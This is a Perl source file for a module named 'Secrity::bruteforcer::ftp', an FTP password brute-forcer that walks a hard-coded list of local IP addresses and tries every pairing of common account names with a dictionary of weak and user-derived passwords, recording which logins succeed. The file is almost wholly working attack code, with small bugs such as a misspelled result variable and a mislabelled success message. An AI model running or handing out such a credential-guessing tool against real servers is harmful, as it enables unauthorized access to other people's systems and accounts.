package Secrity::bruteforcer::ftp

use 5.006;
use IO::Socket;
use strict;
use warnings;

=head1 NAME

Secrity::bruteforcer::ftp - The great new Secrity::bruteforcer::ftp!

=head1 VERSION

Version 0.01

=cut

our $VERSION = '0.01';

 
=pod
my($host,$port)=@ARGV;
my  $STAT=0;
my $sock = new IO::Socket::INET (
PeerHost => $host,
PeerPort => $port,
Proto => 'tcp',
) or die "ERROR in Socket Creation : $!\n";

print "TCP Connection Success.\n";

#$sock->connect($host,$port);
$sock->send('stats\r\n') if $STAT;
my $msg;
my $result=$sock->recv($msg,254);
print $msg,"\n";
close($socket);
=cut

my @hosts=qw(

192.168.1.1
192.168.1.2
192.168.1.3
192.168.1.4
192.168.1.5
192.168.1.6

);

my @usrs = ('www','admin','root','db','wwwroot','data','web','ftp','media');
my @pws = ('123456','admin','root','ftp','password','123123','123','1','{user}','{user}{user}','{user}1','{user}123','{user}2016','{user}2015','{user}!','','P@ssw0rd!!','qwa123','12345678','test','123qwe!@#','123456789','123321','1314520','666666','woaini','fuckyou','000000','1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456','1q2w3e4r','123qwe','159357','p@ssw0rd','p@55w0rd','password!','p@ssw0rd!','password1','r00t','tomcat','apache','system');

for(@hosts) {

my $re=ftp($_);

print $_,": Anonymous opened! \n" if $re;

}

sub ftp {

use Net::FTP;  

my ($host)=@_;  
  
my $ftp = Net::FTP->new("$host", Debug =>0)  
or print "Can't connect to $host: $@\n";  

my $reuslt;
  
for(@usrs) {

my $user=$_;

for(@pws) {

my $pwd=$_;

$pwd=~s/\{user\}/$user/g if /\{user\}/;

#print $user.'=>'.$pwd,"\n";

$result.= "$user $pwd \n" if $ftp->login($user,$pwd);

#print "Can't login ", $ftp->message,"\n";  


}

}
=pod  
$ftp->cwd("/pub/FreeBSD/doc/")  
or die "Can't change dir\n", $ftp->message;  
  
$ftp->get("README")  
or die "get failed\n", $ftp->message;  
=cut 
$ftp->quit;
return $result;

}
  
exit 0; 
